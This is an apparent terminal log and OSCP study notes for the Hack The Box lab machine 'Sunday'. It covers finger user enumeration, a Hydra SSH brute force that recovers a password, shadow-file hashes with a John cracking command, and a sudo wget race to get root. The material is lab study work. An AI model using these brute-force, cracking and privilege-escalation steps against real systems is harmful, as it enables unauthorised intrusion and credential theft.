@@ -1,0 +1,218 @@
+
+
+┌──(kali㉿kali)-[~]
+└─$ finger root@10.10.10.76
+finger admin@10.10.10.76
+finger sunday@10.10.10.76
+Login       Name               TTY         Idle    When    Where
+root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46         
+Login       Name               TTY         Idle    When    Where
+adm      Admin                              < .  .  .  . >
+dladm    Datalink Admin                     < .  .  .  . >
+netadm   Network Admin                      < .  .  .  . >
+netcfg   Network Configuratio               < .  .  .  . >
+dhcpserv DHCP Configuration A               < .  .  .  . >
+ikeuser  IKE Admin                          < .  .  .  . >
+lp       Line Printer Admin                 < .  .  .  . >
+Login       Name               TTY         Idle    When    Where
+sunday                ???
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ showmount -e 10.10.10.76
+rpcinfo -p 10.10.10.76
+clnt_create: RPC: Authentication error
+10.10.10.76: RPC: Authentication error
+                                        
+
+msf6 auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/seclists/Usernames/Names/names.txt 
+USERS_FILE => /usr/share/seclists/Usernames/Names/names.txt
+msf6 auxiliary(scanner/finger/finger_users) > run
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netcfg
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dhcpserv
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ikeuser
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netadm
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: smmsp
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sammy
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
+[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys
+[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, dhcpserv, dladm, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, root, sammy, smmsp, sunny, sys
+[*] 10.10.10.76:79        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/finger/finger_users) > 
+
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -L users_sunday.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.76 -s 22022
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-06 05:51:52
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.10.76:22022/
+[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 9 final worker threads did not complete until end.
+[ERROR] 9 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-06 05:53:01
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ ssh -p 22022 sunny@10.10.10.76
+(sunny@10.10.10.76) Password: 
+Warning: 13 failed authentication attempts since last successful authentication.  The latest at Wed Aug 06 09:53 2025.
+Warning: 13 failed authentication attempts since last successful authentication.  The latest at Wed Aug 06 09:53 2025.
+Last login: Wed Aug  6 09:53:10 2025 from 10.10.14.11
+Oracle Solaris 11.4.42.111.0                  Assembled December 2021
+sunny@sunday:~$ ls
+local.cshrc    local.login    local.profile
+sunny@sunday:~$ 
+
+
+
+
+sunny@sunday:/backup$ cat agent22.backup
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+sunny@sunday:/backup$ cat shadow.backup
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+sunny@sunday:/backup$ 
+
+
+
+
+# HTB: Sunday (OSCP Study Notes)
+
+**Machine Author:** Agent22  
+**Prepared By:** Alexander Reid (Arrexel)  
+**Difficulty:** Medium  
+**Date:** 29th September 2018
+
+---
+
+## SYNOPSIS
+- Focus: Finger service enumeration, weak credentials, sudo NOPASSWD exploitation.
+- OS: Oracle Solaris 11.4.42.111.0 (Assembled December 2021)
+
+---
+
+## Enumeration
+
+### Nmap
+- Finger (port 79)
+- SSH (port 22022)
+- Other standard Solaris services
+
+### Finger
+- Enumerate users with `finger-user-enum` or Metasploit’s `finger_users` module.
+- Use `/usr/share/seclists/Usernames/Names/names.txt` for a large username list.
+- Discovered users: `sammy`, `sunny`, and many system accounts.
+
+---
+
+## Exploitation
+
+### SSH Brute Force
+- Hydra, Medusa, or Metasploit can be used.
+- Credentials found:  
+  - `sunny:sunday` (via Hydra and rockyou.txt)
+- SSH access:  
+  ```bash
+  ssh -p 22022 sunny@10.10.10.76
+  ```
+
+---
+
+## Privilege Escalation
+
+### Backup Files
+- `/backup/agent22.backup` and `/backup/shadow.backup` contain password hashes.
+- Example hashes:
+  ```
+  sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+  sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+  ```
+- Crack with John:
+  ```bash
+  john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup
+  ```
+
+### Sudo NOPASSWD
+- As `sunny`, can run `/root/troll` as root:
+  ```bash
+  sudo -l
+  sudo /root/troll
+  ```
+- `/root/troll` is a troll binary (does not grant root shell).
+
+### Root via Sammy
+- Crack `sammy`'s password from backup files.
+- SSH as `sammy`.
+- `sudo -l` as `sammy` reveals ability to run `sudo wget`.
+- Overwrite `/root/troll` with a shell script using `sudo wget`.
+- Race against a script that reverts `/root/troll` every second.
+- Use two shells to overwrite and execute quickly for root shell.
+
+---
+
+## Key Skills Learned
+- Finger user enumeration
+- SSH brute-forcing
+- Hash extraction and cracking
+- Sudo NOPASSWD exploitation
+- Race condition exploitation
+
+---
+
+## Useful Commands
+
+```bash
+# Enumerate users
+finger-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t <target>
+
+# SSH brute force
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target> -s 22022
+
+# Crack hashes
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup
+
+# Sudo privilege escalation
+sudo -l
+sudo /root/troll
+```
+
+---
+
+## Reference Links
+- [PentestMonkey Finger User Enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)
+- [SecLists Usernames](https://github.com/danielmiessler/SecLists)
+
+---
+
+**Summary:**  
+Sunday is a classic box for practicing user enumeration, brute-forcing, and privilege escalation on Solaris. Pay attention to backup files, hash cracking, and sudo misconfigurations.
